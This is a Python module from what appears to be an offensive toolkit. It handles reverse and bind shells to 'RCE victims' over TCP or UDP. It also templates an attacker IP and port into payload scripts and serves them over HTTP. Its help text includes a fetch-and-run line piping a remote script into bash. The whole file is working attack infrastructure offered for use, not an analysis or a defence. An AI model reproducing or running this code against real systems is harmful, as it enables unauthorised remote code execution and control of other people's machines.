from modules.velpenModules.tSocks import UDPSocketClient, TCPSocketClient, UDPSocketServer, TCPSocketServer
from modules.velpenModules.inject import *
from modules.velpenModules.http import *
from modules.velpenModules.utils import *
from os import listdir, path, mkdir, rmdir, remove
import threading
import time

def connect(c: list):
    isTCP = True
    if c[1].lower() == "tcp": isTCP = True
    elif c[1].lower() == "udp": isTCP = False

    ip, port = c[2].split(":")

    if not isTCP:
        UDPSocketClient().shellConnect(ip, int(port))
    else:
        TCPSocketClient().shellConnect(ip, int(port))

def server(c: list):
    isTCP = True
    if c[1].lower() == "tcp": isTCP = True
    elif c[1].lower() == "udp": isTCP = False
    ip, port = c[2].split(":")

    if not isTCP:
        UDPSocketServer(server=(ip, int(port))).interactive()
    else:
        TCPSocketServer(server=(ip, int(port))).interactive()

def httpServer(c: list):
    if not SysVar.HTTPServing:

        for i in listdir("./modules/injects"): # read our files
            try:
                SysVar.injectsData.append([
                                        open("./modules/injects/{}".format(i), "r").read(),
                                        i
                                        ])
            except FileNotFoundError:
                uError("./modules/injects/{} doesn't exist".format(i))

        for data in SysVar.injectsData: # regex our things
            try:
                data[0] = data[0].replace('%%%%%%PORT%%%%%%', str(SysVar.RCEProbePORT))
                data[0] = data[0].replace('%%%%%%IPV4%%%%%%', str(SysVar.RCEProbeIP))
            except TypeError:
                uError("IPv4 address or port isnt set; use setServerIP and setServerPort")

        if not path.exists("./modules/activeInjects"): # if our path doesnt exist
            mkdir("./modules/activeInjects") # make it

        for data in SysVar.injectsData:
            with open("./modules/activeInjects/{}".format(data[1]), "w") as w:
                w.write(data[0])
                w.flush()
            uSuccess("wrote regex'd file to ./modules/activeInjects/{}".format(data[1]))

        a = HTTPServer(port=int(c[1]))
        threading.Thread(target=a.forever, daemon=True).start()
        SysVar.HTTPServing = True
        SysVar.HTTP = a

        print("[!] running server")
    else:
        SysVar.HTTPServing = False
        SysVar.HTTP.shutdown()
        print("[!] shut down server")

def setTimeout(c:list):
    SysVar.timeout = c[1]
    uStatus("ok")

def setServerIP(c:list):
    try:
        SysVar.RCEProbeIP = c[1]
        uStatus("ok")
    except IndexError:
        uStatus(SysVar.RCEProbeIP)

def setServerPort(c:list):
    try:
        SysVar.RCEProbePORT = int(c[1])
        uStatus("ok")
    except IndexError:
        uStatus(SysVar.RCEProbePORT)

def closeHTTP():
    if SysVar.HTTPServing:
        uStatus("shutting down server")
        SysVar.HTTP.shutdown()
        time.sleep(0.5)

    if path.exists('./modules/activeInjects'):
        for file in listdir("./modules/activeInjects"):
            remove("{}/{}".format("./modules/activeInjects", file))
        rmdir("./modules/activeInjects")

class SysVar:
    """"""

    HTTPServing = None
    HTTP = None
    timeout = "120"
    RCEProbeIP = None
    RCEProbePORT = None
    injectsData = []

    options = {
        "connect": "connect to a persistent RCE victim using tcp or udp; connect tcp/udp ip:port",
        "server": "start a tcp or udp server to make a victim connect to you, making a temporary rce; server tcp/udp",
        "httpServer":  "start an HTTP server so you can quickly execute scripts using curl (ex: curl 10.10.10.10/bash.inj | bash)",
        "setTimeout": "set socket timeout to prevent being hung waiting for a connection; setTimeout (num)",
        "setServerIP": "set IP for reverse shell clients to connect to; put no args to print the current ip set",
        "setServerPort": "set port for reverse shell clients to connect to; put no args to print the current port set",
        "closeHTTP": "close HTTP server and it's processes",
    }

def functions():
    return SysVar.options
